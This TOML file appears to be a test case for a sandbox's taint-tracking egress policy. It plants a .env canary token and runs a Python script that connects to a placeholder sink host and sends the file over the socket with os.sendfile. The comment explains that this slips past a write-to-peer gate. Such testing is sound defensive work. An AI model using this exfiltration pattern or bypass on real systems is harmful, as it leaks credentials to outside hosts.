# Found by the fuzzer. sendfile copies the secret straight to the socket with
# no userspace read, and its read of the source is recorded only when it
# returns. The write-to-connected-peer gate must count that source as read at
# the call's entry, or the principal is untainted when the egress is judged.
name = "sendfile-exfil"
kind = "attack"
policy = "recommended"

[[files]]
path = ".env"
contents = "TOKEN={CANARY}\n"

[[files]]
path = "sf.py"
contents = """
import os, socket
s = socket.socket()
s.connect(("{SINK_HOST}", {SINK_PORT}))
fd = os.open(".env", os.O_RDONLY)
try:
    os.sendfile(s.fileno(), fd, 0, 4096)
except PermissionError:
    pass
"""

[[steps]]
shell = 0
run = "python3 sf.py"
expect = "any"

[oracle]
encodings = ["raw", "base64", "hex"]
